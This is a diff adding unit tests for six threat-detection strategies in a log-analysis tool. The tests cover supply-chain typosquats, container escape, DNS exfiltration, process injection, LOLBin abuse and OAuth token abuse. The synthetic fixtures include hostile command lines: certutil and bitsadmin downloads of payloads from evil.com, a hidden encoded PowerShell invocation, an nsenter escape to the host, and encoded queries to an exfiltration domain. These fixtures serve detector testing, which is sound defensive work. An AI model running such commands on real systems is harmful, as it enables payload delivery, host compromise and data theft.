@@ -31,7 +31,13 @@ from strategies import (
     PrivilegeEscalationStrategy,
     WebshellDetectionStrategy,
     CredentialDumpingStrategy,
-    RansomwareIndicatorStrategy
+    RansomwareIndicatorStrategy,
+    SupplyChainAttackStrategy,
+    ContainerEscapeStrategy,
+    DNSExfiltrationStrategy,
+    ProcessInjectionStrategy,
+    LiveOffLandStrategy,
+    OAuthAbuseStrategy
 )
 
 
@@ -871,7 +877,13 @@ class TestStrategyRequirements(unittest.TestCase):
         PrivilegeEscalationStrategy,
         WebshellDetectionStrategy,
         CredentialDumpingStrategy,
-        RansomwareIndicatorStrategy
+        RansomwareIndicatorStrategy,
+        SupplyChainAttackStrategy,
+        ContainerEscapeStrategy,
+        DNSExfiltrationStrategy,
+        ProcessInjectionStrategy,
+        LiveOffLandStrategy,
+        OAuthAbuseStrategy
     ]
     
     def test_all_strategies_have_names(self):
@@ -1696,6 +1708,485 @@ class TestRansomwareIndicatorStrategy(unittest.TestCase):
         self.assertIn('ransomware_score', explanations)
         self.assertIn('source_ip', explanations)
         self.assertIn('preparation_commands', explanations)
+
+
+class TestSupplyChainAttackStrategy(unittest.TestCase):
+    """Test the Supply Chain Attack Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = SupplyChainAttackStrategy()
+    
+    def test_suspicious_package_detection(self):
+        """Test that suspicious packages are detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create suspicious package installations
+        for i in range(15):
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i),
+                'source_ip': '192.168.1.100',
+                'package_name': 'numpyy',  # Typosquat
+                'registry_url': 'https://pastebin.com/packages',  # Suspicious registry
+                'user_agent': 'python-requests/2.28'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'package_name': 'package_name',
+            'registry_url': 'registry_url',
+            'user_agent': 'user_agent'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect supply chain threat
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['supply_chain_score'], 50)
+        self.assertIn('typosquatting', result.iloc[0]['flags'])
+    
+    def test_normal_packages_not_flagged(self):
+        """Test that normal package installations are not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal package installations
+        for i in range(5):
+            data.append({
+                'timestamp': base_time + timedelta(minutes=i),
+                'source_ip': '192.168.1.100',
+                'package_name': 'requests',  # Legitimate package
+                'registry_url': 'https://pypi.org/simple',
+                'user_agent': 'pip/23.0'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'package_name': 'package_name',
+            'registry_url': 'registry_url',
+            'user_agent': 'user_agent'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal packages
+        self.assertTrue(result.empty or result.iloc[0]['supply_chain_score'] < 50)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('supply_chain_score', explanations)
+        self.assertIn('package_name', explanations)
+        self.assertIn('flags', explanations)
+
+
+class TestContainerEscapeStrategy(unittest.TestCase):
+    """Test the Container Escape Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = ContainerEscapeStrategy()
+    
+    def test_escape_attempt_detection(self):
+        """Test that container escape attempts are detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create escape attempt commands
+        for i in range(10):
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i),
+                'container_id': 'container_abc123',
+                'command': 'nsenter --target 1 --mount --uts --ipc --net /bin/bash',
+                'user': 'root',
+                'process_name': 'nsenter'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'container_id': 'container_id',
+            'command': 'command',
+            'user': 'user',
+            'process_name': 'process_name'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect escape attempts
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['escape_score'], 50)
+        self.assertIn('escape_command', result.iloc[0]['flags'])
+    
+    def test_normal_container_activity_not_flagged(self):
+        """Test that normal container activity is not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal container commands
+        for i in range(5):
+            data.append({
+                'timestamp': base_time + timedelta(minutes=i),
+                'container_id': 'container_abc123',
+                'command': 'ls -la',
+                'user': 'appuser',
+                'process_name': 'ls'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'container_id': 'container_id',
+            'command': 'command',
+            'user': 'user',
+            'process_name': 'process_name'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal activity
+        self.assertTrue(result.empty)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('escape_score', explanations)
+        self.assertIn('container_id', explanations)
+        self.assertIn('dangerous_commands', explanations)
+
+
+class TestDNSExfiltrationStrategy(unittest.TestCase):
+    """Test the DNS Exfiltration Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = DNSExfiltrationStrategy()
+    
+    def test_dns_exfiltration_detection(self):
+        """Test that DNS exfiltration patterns are detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create suspicious DNS queries with encoding
+        for i in range(120):
+            # Generate base64-like subdomains
+            subdomain = f"SGVsbG9Xb3JsZFRoaXNJc0EKVGVzdA{i:03d}"
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i * 0.5),
+                'source_ip': '192.168.1.100',
+                'query_name': f'{subdomain}.exfil.example.com',
+                'query_type': 'A',
+                'response_size': 64
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'query_name': 'query_name',
+            'query_type': 'query_type',
+            'response_size': 'response_size'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect exfiltration
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['exfiltration_score'], 50)
+        self.assertIn('base64_encoding', result.iloc[0]['flags'])
+    
+    def test_normal_dns_not_flagged(self):
+        """Test that normal DNS queries are not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal DNS queries
+        domains = ['google.com', 'github.com', 'stackoverflow.com', 'python.org']
+        for i, domain in enumerate(domains):
+            data.append({
+                'timestamp': base_time + timedelta(minutes=i),
+                'source_ip': '192.168.1.100',
+                'query_name': domain,
+                'query_type': 'A',
+                'response_size': 32
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'query_name': 'query_name',
+            'query_type': 'query_type',
+            'response_size': 'response_size'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal DNS
+        self.assertTrue(result.empty)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('exfiltration_score', explanations)
+        self.assertIn('base64_like_queries', explanations)
+        self.assertIn('avg_subdomain_length', explanations)
+
+
+class TestProcessInjectionStrategy(unittest.TestCase):
+    """Test the Process Injection Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = ProcessInjectionStrategy()
+    
+    def test_injection_detection(self):
+        """Test that process injection is detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create injection activity
+        for i in range(15):
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i),
+                'source_process': 'malware.exe',
+                'target_process': 'svchost.exe',
+                'api_call': 'CreateRemoteThread',
+                'parent_process': 'explorer.exe'
+            })
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i + 0.5),
+                'source_process': 'malware.exe',
+                'target_process': 'svchost.exe',
+                'api_call': 'WriteProcessMemory',
+                'parent_process': 'explorer.exe'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_process': 'source_process',
+            'target_process': 'target_process',
+            'api_call': 'api_call',
+            'parent_process': 'parent_process'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect injection
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['injection_score'], 50)
+        self.assertIn('classic_injection', result.iloc[0]['flags'])
+    
+    def test_normal_process_activity_not_flagged(self):
+        """Test that normal process activity is not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal process interactions
+        for i in range(3):
+            data.append({
+                'timestamp': base_time + timedelta(minutes=i),
+                'source_process': 'notepad.exe',
+                'target_process': 'explorer.exe',
+                'api_call': 'SendMessage',
+                'parent_process': 'explorer.exe'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_process': 'source_process',
+            'target_process': 'target_process',
+            'api_call': 'api_call',
+            'parent_process': 'parent_process'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal activity
+        self.assertTrue(result.empty)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('injection_score', explanations)
+        self.assertIn('source_process', explanations)
+        self.assertIn('injection_apis', explanations)
+
+
+class TestLiveOffLandStrategy(unittest.TestCase):
+    """Test the Living-off-the-Land Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = LiveOffLandStrategy()
+    
+    def test_lolbin_abuse_detection(self):
+        """Test that LOLBin abuse is detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create LOLBin abuse patterns
+        data.append({
+            'timestamp': base_time,
+            'source_ip': '192.168.1.100',
+            'username': 'attacker',
+            'process_name': 'certutil.exe',
+            'command_line': 'certutil -urlcache -split -f http://evil.com/payload.exe'
+        })
+        data.append({
+            'timestamp': base_time + timedelta(seconds=5),
+            'source_ip': '192.168.1.100',
+            'username': 'attacker',
+            'process_name': 'powershell.exe',
+            'command_line': 'powershell -enc SGVsbG9Xb3JsZA== -WindowStyle Hidden'
+        })
+        data.append({
+            'timestamp': base_time + timedelta(seconds=10),
+            'source_ip': '192.168.1.100',
+            'username': 'attacker',
+            'process_name': 'bitsadmin.exe',
+            'command_line': 'bitsadmin /transfer myDownload http://evil.com/file.exe C:\\temp\\file.exe'
+        })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'username': 'username',
+            'process_name': 'process_name',
+            'command_line': 'command_line'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect LOLBin abuse
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['lolbin_score'], 40)
+        self.assertIn('_abuse', result.iloc[0]['flags'])
+    
+    def test_normal_tool_usage_not_flagged(self):
+        """Test that normal system tool usage is not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal tool usage
+        data.append({
+            'timestamp': base_time,
+            'source_ip': '192.168.1.100',
+            'username': 'admin',
+            'process_name': 'powershell.exe',
+            'command_line': 'Get-Process'
+        })
+        data.append({
+            'timestamp': base_time + timedelta(minutes=1),
+            'source_ip': '192.168.1.100',
+            'username': 'admin',
+            'process_name': 'cmd.exe',
+            'command_line': 'dir C:\\'
+        })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'username': 'username',
+            'process_name': 'process_name',
+            'command_line': 'command_line'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal usage
+        self.assertTrue(result.empty)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('lolbin_score', explanations)
+        self.assertIn('lolbins_used', explanations)
+        self.assertIn('technique_count', explanations)
+
+
+class TestOAuthAbuseStrategy(unittest.TestCase):
+    """Test the OAuth Abuse Detector strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = OAuthAbuseStrategy()
+    
+    def test_oauth_abuse_detection(self):
+        """Test that OAuth token abuse is detected."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create OAuth abuse pattern with excessive refresh tokens from multiple IPs
+        for i in range(120):
+            data.append({
+                'timestamp': base_time + timedelta(seconds=i * 5),
+                'source_ip': f'10.0.{i % 20}.{i % 255}',  # Many different IPs
+                'username': 'victim@example.com',
+                'grant_type': 'refresh_token',
+                'scope': 'offline_access mail.read files.readwrite.all'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'username': 'username',
+            'grant_type': 'grant_type',
+            'scope': 'scope'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect OAuth abuse
+        self.assertFalse(result.empty)
+        self.assertGreaterEqual(result.iloc[0]['oauth_abuse_score'], 50)
+        self.assertIn('excessive_refresh', result.iloc[0]['flags'])
+    
+    def test_normal_oauth_not_flagged(self):
+        """Test that normal OAuth usage is not flagged."""
+        base_time = datetime.now()
+        data = []
+        
+        # Create normal OAuth requests
+        for i in range(5):
+            data.append({
+                'timestamp': base_time + timedelta(hours=i),
+                'source_ip': '192.168.1.100',
+                'username': 'user@example.com',
+                'grant_type': 'authorization_code',
+                'scope': 'user.read'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'timestamp': 'timestamp',
+            'source_ip': 'source_ip',
+            'username': 'username',
+            'grant_type': 'grant_type',
+            'scope': 'scope'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal usage
+        self.assertTrue(result.empty)
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('oauth_abuse_score', explanations)
+        self.assertIn('refresh_token_count', explanations)
+        self.assertIn('unique_source_ips', explanations)
 
 
 if __name__ == '__main__':
